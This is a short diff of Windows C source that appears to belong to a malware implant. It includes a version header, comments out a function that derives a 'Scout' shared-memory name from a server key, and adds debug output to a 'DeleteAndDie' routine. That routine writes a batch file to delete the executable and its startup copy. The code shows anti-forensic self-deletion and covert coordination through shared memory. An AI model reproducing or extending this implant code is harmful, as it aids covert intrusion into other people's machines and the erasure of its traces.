@@ -10,6 +10,9 @@
 #include "JSON.h"
 #include "crypt.h"
 
+#define _INCLUDE_GLOBAL_FUNCTIONS_
+#include "version.h"
+
 HKEY GetRegistryKeyHandle(__in HKEY hParentKey, __in LPWSTR strSubKey, __in DWORD dwSamDesidered)
 {
 	HKEY hKey;
@@ -62,13 +65,14 @@ LPSTR GetEliteSharedMemoryName()
 	return pName;
 }
 
+/*
 LPWSTR GetScoutSharedMemoryName()
 {
 	WCHAR strFormat[] = { L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'%', L'0', L'2', L'X', L'\0' };
-	LPWSTR pName = (LPWSTR)zalloc(16 * sizeof(WCHAR));
+	LPWSTR pName = (LPWSTR)zalloc(18 * sizeof(WCHAR));
 
 	_snwprintf_s(pName, 
-		16,
+		18,
 		_TRUNCATE,
 		strFormat,
 		pServerKey[5], pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0]);
@@ -78,6 +82,7 @@ LPWSTR GetScoutSharedMemoryName()
 
 	return pName;
 }
+*/
 
 BOOL ExistsEliteSharedMemory()
 {
@@ -290,7 +295,7 @@ VOID DeleteAndDie(__in BOOL bDie)
 	while(1);
 
 #ifdef _DEBUG
-	OutputDebug(pBatFileName);
+	OutputDebug(pBatFileName);	
 #endif
 
 	// get full filename in startup
@@ -301,6 +306,10 @@ VOID DeleteAndDie(__in BOOL bDie)
 	LPSTR pBatchBuffer = (LPSTR) zalloc(uSize);
 	memset(pBatchBuffer, 0x0, uSize);
 	_snprintf_s(pBatchBuffer, uSize, _TRUNCATE, batch_format, pExeFileName, pExeFileName, pBatFileName);
+
+#ifdef _DEBUG
+	OutputDebug(pExeFileName);	
+#endif
 
 	// write it
 	ULONG uOut;
